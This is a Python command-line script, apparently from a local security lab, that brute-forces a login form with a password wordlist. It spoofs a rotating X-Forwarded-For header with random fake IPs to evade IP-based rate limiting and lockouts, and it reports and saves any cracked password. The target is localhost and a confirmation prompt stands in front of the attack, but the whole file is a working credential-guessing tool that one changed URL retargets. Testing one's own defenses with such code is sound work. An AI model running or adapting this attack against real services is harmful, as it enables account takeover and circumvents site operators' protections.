"""
Distributed Attack Simulation
Simulates IP rotation to bypass IP-based defenses
"""
import requests
import time
import argparse
import json
import random
from datetime import datetime

TARGET_URL = "http://localhost:5000/login"

def print_banner():
    print("=" * 60)
    print("  DISTRIBUTED ATTACK SIMULATOR (IP Rotation)")
    print("  WARNING: For authorized testing only!")
    print("=" * 60)
    print()

def generate_fake_ips(count=100):
    """Generate fake IP addresses for X-Forwarded-For header"""
    ips = []
    for _ in range(count):
        ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        ips.append(ip)
    return ips

def run_attack(username, wordlist_path, verbose=False, delay=0, ip_pool_size=50):
    """
    Execute distributed attack with IP rotation

    Args:
        username: Target username
        wordlist_path: Path to password wordlist
        verbose: Print each attempt
        delay: Delay between requests in seconds
        ip_pool_size: Number of fake IPs to rotate through
    """
    results = {
        "attack_type": "distributed",
        "username": username,
        "attempts": 0,
        "success": 0,
        "blocked": 0,
        "failed": 0,
        "start_time": time.time(),
        "cracked_password": None,
        "ip_pool_size": ip_pool_size
    }

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {username}")
    print(f"[*] Wordlist: {wordlist_path}")
    print(f"[*] IP Pool Size: {ip_pool_size}")
    print(f"[*] Starting attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # Generate fake IP pool
    fake_ips = generate_fake_ips(ip_pool_size)
    print(f"[*] Generated {len(fake_ips)} fake IPs for rotation")
    print()

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {wordlist_path}")
        return results

    for password in passwords:
        results["attempts"] += 1

        # Rotate IP for each request
        fake_ip = random.choice(fake_ips)
        headers = {"X-Forwarded-For": fake_ip}

        try:
            response = requests.post(
                TARGET_URL,
                data={"username": username, "password": password},
                headers=headers,
                timeout=5
            )

            if response.status_code == 200 or 'dashboard' in response.url:
                results["success"] += 1
                results["cracked_password"] = password
                if verbose:
                    print(f"[SUCCESS] ✓ Password found: {password} (IP: {fake_ip})")
                print(f"\n[+] ATTACK SUCCESSFUL!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                print(f"[+] Attempts: {results['attempts']}")
                print(f"[+] Final IP: {fake_ip}")
                break

            elif response.status_code in [429, 403]:
                results["blocked"] += 1
                if verbose:
                    print(f"[BLOCKED] ✗ IP {fake_ip} blocked, rotating...")
                # Continue with next IP

            else:
                results["failed"] += 1
                if verbose:
                    print(f"[FAIL] {results['attempts']:4d} | {password} (IP: {fake_ip})")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[ERROR] Request failed: {e}")
            results["failed"] += 1

        if delay > 0:
            time.sleep(delay)

    results["end_time"] = time.time()
    results["duration_sec"] = results["end_time"] - results["start_time"]

    return results

def save_results(results):
    """Save attack results to file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"results/distributed_{timestamp}.json"

    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n[*] Results saved to: {filename}")

def print_summary(results):
    """Print attack summary"""
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"Attack Type:       {results['attack_type']}")
    print(f"IP Pool Size:      {results['ip_pool_size']}")
    print(f"Total Attempts:    {results['attempts']}")
    print(f"Successful:        {results['success']}")
    print(f"Failed:            {results['failed']}")
    print(f"Blocked:           {results['blocked']}")
    print(f"Duration:          {results['duration_sec']:.2f} seconds")
    if results['success'] > 0:
        print(f"Cracked Password:  {results['cracked_password']}")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Distributed Attack Simulator")
    parser.add_argument("-u", "--username", required=True, help="Target username")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("-p", "--pool-size", type=int, default=50, help="IP pool size for rotation")
    parser.add_argument("--save", action="store_true", help="Save results to file")

    args = parser.parse_args()

    print_banner()

    # Confirm local testing
    confirm = input("Confirm this is LOCAL TESTING ONLY (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        exit(0)

    results = run_attack(args.username, args.wordlist, args.verbose, args.delay, args.pool_size)
    print_summary(results)

    if args.save:
        save_results(results)
